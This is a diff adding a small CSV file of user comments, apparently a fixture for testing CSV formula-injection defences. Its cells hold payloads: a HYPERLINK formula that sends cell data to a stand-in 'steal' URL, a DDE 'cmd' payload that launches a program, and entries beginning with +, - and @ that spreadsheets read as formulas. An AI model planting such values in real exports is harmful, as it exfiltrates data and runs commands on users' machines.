@@ -1,0 +1,6 @@
+User,Comment,Score
+alice,"=HYPERLINK(""http://example.com/steal?d=""&A1,""Click me"")",10
+bob,"=cmd|' /C calc'!A0",7
+carol,+SUM(1+1),8
+dave,-2+3,9
+eve,"@SUM(1,2)",6
